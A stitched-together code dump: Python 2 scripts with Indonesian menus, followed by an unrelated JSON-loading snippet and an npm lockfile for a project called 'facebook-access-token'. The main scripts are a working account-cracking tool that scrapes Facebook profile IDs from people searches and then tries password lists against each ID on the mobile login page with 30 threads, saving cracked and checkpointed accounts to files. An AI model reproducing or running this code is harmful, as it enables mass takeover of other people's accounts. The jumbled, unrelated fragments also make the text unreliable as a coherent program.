		except:
			pass
	p = ThreadPool(30)
	p.map(main, id)
	print
	print '\033[0m[\033[92m✓\033[0m] Selesai ...'
	print"\033[0m[\033[95m+\033[0m] Total \033[92mOK\033[0m/\033[94mCP\033[0m :\033[92m "+str(len(oks))+"\033[0m/\033[94m"+str(len(cekpoint))
	print("\033[0m[\033[93m+\033[0m] CP File tersimpan : out/usa.txt")
	raw_input("\n\033[96m[\033[0m Kembali \033[96m]")
	os.system('python2 vip.py')
	
	
import requests,bs4,sys,os
import requests,sys
from multiprocessing.pool import ThreadPool

class crack:
	def __init__(self):
		self.ada=[]
		self.cp=[]
		self.ko=0
		try:
			os.system("clear")
			print logo
			self.fl=open(raw_input("[~] Id file list : ")).read().splitlines()
		except Exception as e:
			print "!: %s"%e
			crack()
		print "[+] Contoh > Rio123,Rio12345"
		self.pwlist()
		
	def pwlist(self):
		self.pw=raw_input("[?] Password list : ").split(",")
		if len(self.pw) ==0:
			self.pwlist()
		else:
			print "+: account found saved to: multiresult.txt"
			print "+: account checkpoint saved to: checkpoint.txt"
			ThreadPool(30).map(self.main,self.fl)
			exit("\n+: finished.")
		
	def main(self,fl):
		try:
			for i in self.pw:
				r=requests.Session()
				r.get("https://mbasic.facebook.com/login")
				r.headers.update({"User-Agent":"Mozilla/5.0 (Linux; Android 7.1.2; Redmi 4X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Mobile Safari/537.36"})
				b=r.post("https://mbasic.facebook.com/login", data={"email":fl,"pass":i}).url
				if "c_user" in r.cookies.get_dict():
					self.ada.append("%s|%s"%(fl,i))
					open("multiresult.txt","a+").write("%s|%s\n"%(fl,i))
				if "checkpoint" in b:
					self.cp.append("%s|%s"%(fl,i))
					open("checkpoint.txt","a+").write("%s|%s\n"%(fl,i))
			self.ko+=1
			print "\r[Crack] %s/%s - found-:%s - cp-:%s"%(self.ko,len(self.fl),len(self.ada),len(self.cp)),;sys.stdout.flush()
		except:
			self.main(fl)
			
def search(fl,r,b):
	open(fl,"a+")
	b=bs4.BeautifulSoup(r.get(b).text,"html.parser")
	for i in b.find_all("a",href=True):
		print "\r[GET]: %s id..."%(len(open(fl).read().splitlines())),;sys.stdout.flush()
		if "<img alt=" in str(i):
			if "home.php" in str(i["href"]):
				continue
			else:
				g=str(i["href"])
				if "profile.php" in g:
					d=bs4.re.findall("/profile\.php\?id=(.*?)&",g)
					if len (d) !=0:
						pk="".join(d)
						open(fl,"a+").write("%s\n"%(pk))
				else:
					d=bs4.re.findall("/(.*?)\?",g)
					if len(d) !=0:
						pk="".join(d)
						open(fl,"a+").write("%s\n"%(pk))
		if "Lihat Hasil Selanjutnya" in i.text:
			search(fl,r,i["href"])
	print "\n[+] finished."
				

def dumpfl():
	r=requests.Session()
	r.get("https://mbasic.facebook.com/login")
	r.headers.update({"User-Agent":"Mozilla/5.0 (Linux; Android 7.1.2; Redmi 4X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Mobile Safari/537.36"})
	os.system('clear')
	print logo
	print "[×] Login Kembali Akun Facebook Anda [×] "
	r.post("https://mbasic.facebook.com/login", data={"email":raw_input("[€] Email/id : "),"pass":raw_input("[?] Password : ")}).url
	if "c_user" in r.cookies.get_dict():
		fl=raw_input("[?] Nama File : ")
		s=raw_input("[!] Nama Target : ")
		print ("[•] Contoh : Fajar Rizky")
		search(fl,r,"https://mbasic.facebook.com/search/people/?q="+s)

def cari():
	os.system("clear")
	print logo
	print "1. Dump id By Search Name"
	print "2. Crack"
	print "0. Kembali\n"
	r=raw_input("︻デ═一▸ : ")
	if r=="":
		os.system("clear")
	elif r =="1":
		dumpfl()
	elif r=="2":
		crack()
	elif r=="0":
		menu()
	else:
		print "!: wrong input"
		cari()


if __name__ == '__main__':
	menu()
	login()
################################



import json

# buka file JSON-nya dulu
file_json = open('petanikode.json')

# load file JSON dari file yang sudah dibuka
data = json.loads(file_json.read())

{
  "name": "facebook-access-token",
  "version": "1.0.0",
  "lockfileVersion": 1,
  "requires": true,
  "dependencies": {
    "accepts": {
      "version": "1.3.5",
      "resolved": "https://registry.npmjs.org/accepts/-/accepts-1.3.5.tgz",
      "integrity": "sha1-63d99gEXI6OxTopywIBcjoZ0a9I=",
      "requires": {
        "mime-types": "~2.1.18",
        "negotiator": "0.6.1"
      }
    },
    "array-flatten": {
      "version": "1.1.1",
      "resolved": "https://registry.npmjs.org/array-flatten/-/array-flatten-1.1.1.tgz",
      "integrity": "sha1-ml9pkFGx5wczKPKgCJaLZOopVdI="
    },
    "axios-proxy-fix": {
      "version": "0.16.3",
      "resolved": "https://registry.npmjs.org/axios-proxy-fix/-/axios-proxy-fix-0.16.3.tgz",
      "integrity": "sha512-dLRTjqYW7A9kuqh3aiFjvQrBSQipVwsHFV401MdQb2JhQS9rAobAMhME2GxZXNXDblWRGCVfW/LdoHUXrPFBRg==",
      "requires": {
        "follow-redirects": "^1.2.3",
        "is-buffer": "^1.1.5"
      }
    },
    "body-parser": {
      "version": "1.18.3",
      "resolved": "https://registry.npmjs.org/body-parser/-/body-parser-1.18.3.tgz",
      "integrity": "sha1-WykhmP/dVTs6DyDe0FkrlWlVyLQ=",
      "requires": {
        "bytes": "3.0.0",
        "content-type": "~1.0.4",
        "debug": "2.6.9",
        "depd": "~1.1.2",
        "http-errors": "~1.6.3",
        "iconv-lite": "0.4.23",
        "on-finished": "~2.3.0",
        "qs": "6.5.2",
        "raw-body": "2.3.3",
        "type-is": "~1.6.16"
      },
      "dependencies": {
        "debug": {
          "version": "2.6.9",
          "resolved": "https://registry.npmjs.org/debug/-/debug-2.6.9.tgz",
          "integrity": "sha512-bC7ElrdJaJnPbAP+1EotYvqZsb3ecl5wi6Bfi6BJTUcNowp6cvspg0jXznRTKDjm/E7AdgFBVeAPVMNcKGsHMA==",
          "requires": {
            "ms": "2.0.0"
          }
        },
        "ms": {
          "version": "2.0.0",
          "resolved": "https://registry.npmjs.org/ms/-/ms-2.0.0.tgz",
          "integrity": "sha1-VgiurfwAvmwpAd9fmGF4jeDVl8g="
        }
      }
    },
    "bytes": {
      "version": "3.0.0",
      "resolved": "https://registry.npmjs.org/bytes/-/bytes-3.0.0.tgz",
      "integrity": "sha1-0ygVQE1olpn4Wk6k+odV3ROpYEg="
    },
    "content-disposition": {
      "version": "0.5.2",
      "resolved": "https://registry.npmjs.org/content-disposition/-/content-disposition-0.5.2.tgz",
      "integrity": "sha1-DPaLud318r55YcOoUXjLhdunjLQ="
    },
    "content-type": {
      "version": "1.0.4",
      "resolved": "https://registry.npmjs.org/content-type/-/content-type-1.0.4.tgz",
      "integrity": "sha512-hIP3EEPs8tB9AT1L+NUqtwOAps4mk2Zob89MWXMHjHWg9milF/j4osnnQLXBCBFBk/tvIG/tUc9mOUJiPBhPXA=="
    },
    "cookie": {
      "version": "0.3.1",
      "resolved": "https://registry.npmjs.org/cookie/-/cookie-0.3.1.tgz",
      "integrity": "sha1-5+Ch+e9DtMi6klxcWpboBtFoc7s="
    },
    "cookie-signature": {
      "version": "1.0.6",
      "resolved": "https://registry.npmjs.org/cookie-signature/-/cookie-signature-1.0.6.tgz",
      "integrity": "sha1-4wOogrNCzD7oylE6eZmXNNqzriw="
    },
    "debug": {
      "version": "3.2.6",
      "resolved": "https://registry.npmjs.org/debug/-/debug-3.2.6.tgz",
      "integrity": "sha512-mel+jf7nrtEl5Pn1Qx46zARXKDpBbvzezse7p7LqINmdoIk8PYP5SySaxEmYv6TZ0JyEKA1hsCId6DIhgITtWQ==",
      "requires": {
        "ms": "^2.1.1"
      }
    },
    "depd": {
      "version": "1.1.2",
      "resolved": "https://registry.npmjs.org/depd/-/depd-1.1.2.tgz",
      "integrity": "sha1-m81S4UwJd2PnSbJ0xDRu0uVgtak="
    },
    "destroy": {
      "version": "1.0.4",
      "resolved": "https://registry.npmjs.org/destroy/-/destroy-1.0.4.tgz",
      "integrity": "sha1-l4hXRCxEdJ5CBmE+N5RiBYJqvYA="
    },
    "ee-first": {
      "version": "1.1.1",
      "resolved": "https://registry.npmjs.org/ee-first/-/ee-first-1.1.1.tgz",
      "integrity": "sha1-WQxhFWsK4vTwJVcyoViyZrxWsh0="
    },
    "encodeurl": {
      "version": "1.0.2",
      "resolved": "https://registry.npmjs.org/encodeurl/-/encodeurl-1.0.2.tgz",
      "integrity": "sha1-rT/0yG7C0CkyL1oCw6mmBslbP1k="
    },
    "escape-html": {
      "version": "1.0.3",
      "resolved": "https://registry.npmjs.org/escape-html/-/escape-html-1.0.3.tgz",
      "integrity": "sha1-Aljq5NPQwJdN4cFpGI7wBR0dGYg="
    },
    "etag": {
      "version": "1.8.1",
      "resolved": "https://registry.npmjs.org/etag/-/etag-1.8.1.tgz",
      "integrity": "sha1-Qa4u62XvpiJorr/qg6x9eSmbCIc="
    },
    "express": {
      "version": "4.16.4",
      "resolved": "https://registry.npmjs.org/express/-/express-4.16.4.tgz",
      "integrity": "sha512-j12Uuyb4FMrd/qQAm6uCHAkPtO8FDTRJZBDd5D2KOL2eLaz1yUNdUB/NOIyq0iU4q4cFarsUCrnFDPBcnksuOg==",
      "requires": {
        "accepts": "~1.3.5",
        "array-flatten": "1.1.1",
        "body-parser": "1.18.3",
        "content-disposition": "0.5.2",
        "content-type": "~1.0.4",
        "cookie": "0.3.1",
        "cookie-signature": "1.0.6",
        "debug": "2.6.9",
        "depd": "~1.1.2",
        "encodeurl": "~1.0.2",
        "escape-html": "~1.0.3",
        "etag": "~1.8.1",
        "finalhandler": "1.1.1",
        "fresh": "0.5.2",
        "merge-descriptors": "1.0.1",
        "methods": "~1.1.2",
        "on-finished": "~2.3.0",
        "parseurl": "~1.3.2",
        "path-to-regexp": "0.1.7",
        "proxy-addr": "~2.0.4",
        "qs": "6.5.2",
        "range-parser": "~1.2.0",
        "safe-buffer": "5.1.2",
        "send": "0.16.2",
        "serve-static": "1.13.2",
        "setprototypeof": "1.1.0",
        "statuses": "~1.4.0",
        "type-is": "~1.6.16",
        "utils-merge": "1.0.1",
        "vary": "~1.1.2"
      },
      "dependencies": {
        "debug": {
          "version": "2.6.9",
          "resolved": "https://registry.npmjs.org/debug/-/debug-2.6.9.tgz",
          "integrity": "sha512-bC7ElrdJaJnPbAP+1EotYvqZsb3ecl5wi6Bfi6BJTUcNowp6cvspg0jXznRTKDjm/E7AdgFBVeAPVMNcKGsHMA==",
          "requires": {
            "ms": "2.0.0"
          }
        },
        "ms": {
          "version": "2.0.0",
          "resolved": "https://registry.npmjs.org/ms/-/ms-2.0.0.tgz",
          "integrity": "sha1-VgiurfwAvmwpAd9fmGF4jeDVl8g="
        }
      }
    },
    "finalhandler": {
      "version": "1.1.1",
      "resolved": "https://registry.npmjs.org/finalhandler/-/finalhandler-1.1.1.tgz",
      "integrity": "sha512-Y1GUDo39ez4aHAw7MysnUD5JzYX+WaIj8I57kO3aEPT1fFRL4sr7mjei97FgnwhAyyzRYmQZaTHb2+9uZ1dPtg==",
      "requires": {
        "debug": "2.6.9",
        "encodeurl": "~1.0.2",
        "escape-html": "~1.0.3",
        "on-finished": "~2.3.0",
        "parseurl": "~1.3.2",
        "statuses": "~1.4.0",
        "unpipe": "~1.0.0"
      },
      "dependencies": {
        "debug": {
          "version": "2.6.9",
          "resolved": "https://registry.npmjs.org/debug/-/debug-2.6.9.tgz",
          "integrity": "sha512-bC7ElrdJaJnPbAP+1EotYvqZsb3ecl5wi6Bfi6BJTUcNowp6cvspg0jXznRTKDjm/E7AdgFBVeAPVMNcKGsHMA==",
          "requires": {
            "ms": "2.0.0"
          }
        },
        "ms": {
          "version": "2.0.0",
          "resolved": "https://registry.npmjs.org/ms/-/ms-2.0.0.tgz",
          "integrity": "sha1-VgiurfwAvmwpAd9fmGF4jeDVl8g="
        }
      }
    },
    "follow-redirects": {
      "version": "1.7.0",
      "resolved": "https://registry.npmjs.org/follow-redirects/-/follow-redirects-1.7.0.tgz",
      "integrity": "sha512-m/pZQy4Gj287eNy94nivy5wchN3Kp+Q5WgUPNy5lJSZ3sgkVKSYV/ZChMAQVIgx1SqfZ2zBZtPA2YlXIWxxJOQ==",
      "requires": {
        "debug": "^3.2.6"
      }
    },
    "forwarded": {
      "version": "0.1.2",
      "resolved": "https://registry.npmjs.org/forwarded/-/forwarded-0.1.2.tgz",
      "integrity": "sha1-mMI9qxF1ZXuMBXPozszZGw/xjIQ="
    },
    "fresh": {
      "version": "0.5.2",
      "resolved": "https://registry.npmjs.org/fresh/-/fresh-0.5.2.tgz",
      "integrity": "sha1-PYyt2Q2XZWn6g1qx+OSyOhBWBac="
    },
    "http-errors": {
      "version": "1.6.3",
      "resolved": "https://registry.npmjs.org/http-errors/-/http-errors-1.6.3.tgz",
      "integrity": "sha1-i1VoC7S+KDoLW/TqLjhYC+HZMg0=",
      "requires": {
        "depd": "~1.1.2",
        "inherits": "2.0.3",
        "setprototypeof": "1.1.0",
        "statuses": ">= 1.4.0 < 2"
      }
    },
    "iconv-lite": {
      "version": "0.4.23",
      "resolved": "https://registry.npmjs.org/iconv-lite/-/iconv-lite-0.4.23.tgz",
      "integrity": "sha512-neyTUVFtahjf0mB3dZT77u+8O0QB89jFdnBkd5P1JgYPbPaia3gXXOVL2fq8VyU2gMMD7SaN7QukTB/pmXYvDA==",
      "requires": {
        "safer-buffer": ">= 2.1.2 < 3"
      }
    },
    "inherits": {
      "version": "2.0.3",
      "resolved": "https://registry.npmjs.org/inherits/-/inherits-2.0.3.tgz",
      "integrity": "sha1-Yzwsg+PaQqUC9SRmAiSA9CCCYd4="
    },
    "ipaddr.js": {
      "version": "1.8.0",
      "resolved": "https://registry.npmjs.org/ipaddr.js/-/ipaddr.js-1.8.0.tgz",
      "integrity": "sha1-6qM9bd16zo9/b+DJygRA5wZzix4="
    },
    "is-buffer": {
      "version": "1.1.6",
      "resolved": "https://registry.npmjs.org/is-buffer/-/is-buffer-1.1.6.tgz",
      "integrity": "sha512-NcdALwpXkTm5Zvvbk7owOUSvVvBKDgKP5/ewfXEznmQFfs4ZRmanOeKBTjRVjka3QFoN6XJ+9F3USqfHqTaU5w=="
    },
    "media-typer": {
      "version": "0.3.0",
      "resolved": "https://registry.npmjs.org/media-typer/-/media-typer-0.3.0.tgz",
      "integrity": "sha1-hxDXrwqmJvj/+hzgAWhUUmMlV0g="
    },
    "merge-descriptors": {
      "version": "1.0.1",
      "resolved": "https://registry.npmjs.org/merge-descriptors/-/merge-descriptors-1.0.1.tgz",
      "integrity": "sha1-sAqqVW3YtEVoFQ7J0blT8/kMu2E="
    },
    "methods": {
      "version": "1.1.2",
      "resolved": "https://registry.npmjs.org/methods/-/methods-1.1.2.tgz",
      "integrity": "sha1-VSmk1nZUE07cxSZmVoNbD4Ua/O4="
    },
    "mime": {
      "version": "1.4.1",
      "resolved": "https://registry.npmjs.org/mime/-/mime-1.4.1.tgz",
      "integrity": "sha512-KI1+qOZu5DcW6wayYHSzR/tXKCDC5Om4s1z2QJjDULzLcmf3DvzS7oluY4HCTrc+9FiKmWUgeNLg7W3uIQvxtQ=="
    },
    "mime-db": {
      "version": "1.38.0",
      "resolved": "https://registry.npmjs.org/mime-db/-/mime-db-1.38.0.tgz",
      "integrity": "sha512-bqVioMFFzc2awcdJZIzR3HjZFX20QhilVS7hytkKrv7xFAn8bM1gzc/FOX2awLISvWe0PV8ptFKcon+wZ5qYkg=="
    },
    "mime-types": {
      "version": "2.1.22",
      "resolved": "https://registry.npmjs.org/mime-types/-/mime-types-2.1.22.tgz",
      "integrity": "sha512-aGl6TZGnhm/li6F7yx82bJiBZwgiEa4Hf6CNr8YO+r5UHr53tSTYZb102zyU50DOWWKeOv0uQLRL0/9EiKWCog==",
      "requires": {
        "mime-db": "~1.38.0"
      }
    },
    "ms": {
      "version": "2.1.1",
      "resolved": "https://registry.npmjs.org/ms/-/ms-2.1.1.tgz",
      "integrity": "sha512-tgp+dl5cGk28utYktBsrFqA7HKgrhgPsg6Z/EfhWI4gl1Hwq8B/GmY/0oXZ6nF8hDVesS/FpnYaD/kOWhYQvyg=="
    },
    "negotiator": {
      "version": "0.6.1",
      "resolved": "https://registry.npmjs.org/negotiator/-/negotiator-0.6.1.tgz",
      "integrity": "sha1-KzJxhOiZIQEXeyhWP7XnECrNDKk="
    },
    "on-finished": {
      "version": "2.3.0",
      "resolved": "https://registry.npmjs.org/on-finished/-/on-finished-2.3.0.tgz",
      "integrity": "sha1-IPEzZIGwg811M3mSoWlxqi2QaUc=",
      "requires": {
        "ee-first": "1.1.1"
      }
    },
    "parseurl": {
      "version": "1.3.2",
      "resolved": "https://registry.npmjs.org/parseurl/-/parseurl-1.3.2.tgz",
      "integrity": "sha1-/CidTtiZMRlGDBViUyYs3I3mW/M="
    },
    "path-to-regexp": {
      "version": "0.1.7",
      "resolved": "https://registry.npmjs.org/path-to-regexp/-/path-to-regexp-0.1.7.tgz",
      "integrity": "sha1-32BBeABfUi8V60SQ5yR6G/qmf4w="
    },
    "proxy-addr": {
      "version": "2.0.4",
      "resolved": "https://registry.npmjs.org/proxy-addr/-/proxy-addr-2.0.4.tgz",
      "integrity": "sha512-5erio2h9jp5CHGwcybmxmVqHmnCBZeewlfJ0pex+UW7Qny7OOZXTtH56TGNyBizkgiOwhJtMKrVzDTeKcySZwA==",
      "requires": {
        "forwarded": "~0.1.2",
        "ipaddr.js": "1.8.0"
      }
    },
    "qs": {
      "version": "6.5.2",
      "resolved": "https://registry.npmjs.org/qs/-/qs-6.5.2.tgz",
      "integrity": "sha512-N5ZAX4/LxJmF+7wN74pUD6qAh9/wnvdQcjq9TZjevvXzSUo7bfmw91saqMjzGS2xq91/odN2dW/WOl7qQHNDGA=="
    },
    "range-parser": {
      "version": "1.2.0",
      "resolved": "https://registry.npmjs.org/range-parser/-/range-parser-1.2.0.tgz",
      "integrity": "sha1-9JvmtIeJTdxA3MlKMi9hEJLgDV4="
    },
    "raw-body": {
      "version": "2.3.3",
      "resolved": "https://registry.npmjs.org/raw-body/-/raw-body-2.3.3.tgz",
      "integrity": "sha512-9esiElv1BrZoI3rCDuOuKCBRbuApGGaDPQfjSflGxdy4oyzqghxu6klEkkVIvBje+FF0BX9coEv8KqW6X/7njw==",
      "requires": {
        "bytes": "3.0.0",
        "http-errors": "1.6.3",
        "iconv-lite": "0.4.23",
        "unpipe": "1.0.0"
      }
    },
    "safe-buffer": {
      "version": "5.1.2",
      "resolved": "https://registry.npmjs.org/safe-buffer/-/safe-buffer-5.1.2.tgz",
      "integrity": "sha512-Gd2UZBJDkXlY7GbJxfsE8/nvKkUEU1G38c1siN6QP6a9PT9MmHB8GnpscSmMJSoF8LOIrt8ud/wPtojys4G6+g=="
    },
    "safer-buffer": {
      "version": "2.1.2",
      "resolved": "https://registry.npmjs.org/safer-buffer/-/safer-buffer-2.1.2.tgz",
      "integrity": "sha512-YZo3K82SD7Riyi0E1EQPojLz7kpepnSQI9IyPbHHg1XXXevb5dJI7tpyN2ADxGcQbHG7vcyRHk0cbwqcQriUtg=="
    },
    "send": {
      "version": "0.16.2",
      "resolved": "https://registry.npmjs.org/send/-/send-0.16.2.tgz",
      "integrity": "sha512-E64YFPUssFHEFBvpbbjr44NCLtI1AohxQ8ZSiJjQLskAdKuriYEP6VyGEsRDH8ScozGpkaX1BGvhanqCwkcEZw==",
      "requires": {
        "debug": "2.6.9",
        "depd": "~1.1.2",
        "destroy": "~1.0.4",
        "encodeurl": "~1.0.2",
        "escape-html": "~1.0.3",
        "etag": "~1.8.1",
        "fresh": "0.5.2",
        "http-errors": "~1.6.2",
        "mime": "1.4.1",
        "ms": "2.0.0",
        "on-finished": "~2.3.0",
        "range-parser": "~1.2.0",
        "statuses": "~1.4.0"
      },
      "dependencies": {
        "debug": {
          "version": "2.6.9",
          "resolved": "https://registry.npmjs.org/debug/-/debug-2.6.9.tgz",
          "integrity": "sha512-bC7ElrdJaJnPbAP+1EotYvqZsb3ecl5wi6Bfi6BJTUcNowp6cvspg0jXznRTKDjm/E7AdgFBVeAPVMNcKGsHMA==",
          "requires": {
            "ms": "2.0.0"
          }
        },
        "ms": {
          "version": "2.0.0",
          "resolved": "https://registry.npmjs.org/ms/-/ms-2.0.0.tgz",
          "integrity": "sha1-VgiurfwAvmwpAd9fmGF4jeDVl8g="
        }
      }
    },
    "serve-static": {
      "version": "1.13.2",
      "resolved": "https://registry.npmjs.org/serve-static/-/serve-static-1.13.2.tgz",
      "integrity": "sha512-p/tdJrO4U387R9oMjb1oj7qSMaMfmOyd4j9hOFoxZe2baQszgHcSWjuya/CiT5kgZZKRudHNOA0pYXOl8rQ5nw==",
      "requires": {
        "encodeurl": "~1.0.2",
        "escape-html": "~1.0.3",
        "parseurl": "~1.3.2",
        "send": "0.16.2"
      }
    },
    "setprototypeof": {
      "version": "1.1.0",
      "resolved": "https://registry.npmjs.org/setprototypeof/-/setprototypeof-1.1.0.tgz",
      "integrity": "sha512-BvE/TwpZX4FXExxOxZyRGQQv651MSwmWKZGqvmPcRIjDqWub67kTKuIMx43cZZrS/cBBzwBcNDWoFxt2XEFIpQ=="
    },
    "statuses": {
      "version": "1.4.0",
      "resolved": "https://registry.npmjs.org/statuses/-/statuses-1.4.0.tgz",
      "integrity": "sha512-zhSCtt8v2NDrRlPQpCNtw/heZLtfUDqxBM1udqikb/Hbk52LK4nQSwr10u77iopCW5LsyHpuXS0GnEc48mLeew=="
    },
    "type-is": {
      "version": "1.6.16",
      "resolved": "https://registry.npmjs.org/type-is/-/type-is-1.6.16.tgz",
      "integrity": "sha512-HRkVv/5qY2G6I8iab9cI7v1bOIdhm94dVjQCPFElW9W+3GeDOSHmy2EBYe4VTApuzolPcmgFTN3ftVJRKR2J9Q==",
      "requires": {
        "media-typer": "0.3.0",
        "mime-types": "~2.1.18"
      }
    },
    "unpipe": {
      "version": "1.0.0",
      "resolved": "https://registry.npmjs.org/unpipe/-/unpipe-1.0.0.tgz",
      "integrity": "sha1-sr9O6FFKrmFltIF4KdIbLvSZBOw="
    },
    "utils-merge": {
      "version": "1.0.1",
      "resolved": "https://registry.npmjs.org/utils-merge/-/utils-merge-1.0.1.tgz",
      "integrity": "sha1-n5VxD1CiZ5R7LMwSR0HBAoQn5xM="
    },
    "uuid": {
      "version": "3.3.2",
      "resolved": "https://registry.npmjs.org/uuid/-/uuid-3.3.2.tgz",
      "integrity": "sha512-yXJmeNaw3DnnKAOKJE51sL/ZaYfWJRl1pK9dr19YFCu0ObS231AB1/LbqTKRAQ5kw8A90rA6fr4riOUpTZvQZA=="
    },
    "vary": {
      "version": "1.1.2",
      "resolved": "https://registry.npmjs.org/vary/-/vary-1.1.2.tgz",
      "integrity": "sha1-IpnwLG3tMNSllhsLn3RSShj2NPw="
    }
  }
}

